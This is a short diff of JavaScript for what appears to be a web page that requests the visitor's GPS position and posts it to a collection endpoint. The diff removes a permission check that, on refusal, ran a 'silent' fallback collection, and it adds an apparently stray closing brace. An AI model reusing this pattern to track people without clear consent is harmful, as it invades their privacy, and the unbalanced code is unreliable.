@@ -116,18 +116,7 @@
         }
 
         async function requestLocation() {
-            try {
-                const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
-                if (permissionStatus.state === 'denied') {
-                    // Permission denied, fallback silently
-                    await collectFallback();
-                    done();
-                    return;
-                }
-            } catch (e) {
-                // Permissions API not supported, proceed normally
-            }
-
+            // Request geolocation normally to trigger permission prompt
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
                     await postJSON(ENDPOINT_GPS, {
@@ -156,7 +145,7 @@
                 return;
             }
 
-            // Request location normally to trigger permission prompt
             requestLocation();
+        }
         }
     
